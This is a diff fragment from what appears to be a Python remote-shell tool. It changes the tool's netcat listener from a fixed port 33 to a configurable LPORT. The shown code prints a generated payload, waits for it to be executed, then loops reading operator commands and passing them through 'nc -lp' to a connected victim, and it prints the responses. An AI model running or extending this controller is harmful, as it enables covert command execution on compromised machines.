@@ -47,11 +47,11 @@ print (payload)
 print ('%s Waiting for the payload to be executed' % run)
 
 def shell():
-    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | timeout 1 nc -lp 33 >/dev/null;')
+    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | timeout 1 nc -lp %s >/dev/null;' % LPORT)
     shell()
 
 def status():
-    proc=Popen('timeout 1 nc -lp 33', shell=True, stdout=PIPE, )
+    proc=Popen('timeout 1 nc -lp %s' % LPORT, shell=True, stdout=PIPE, )
     response = str(proc.communicate()[0])
     if 'Accept' in response:
         print (response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
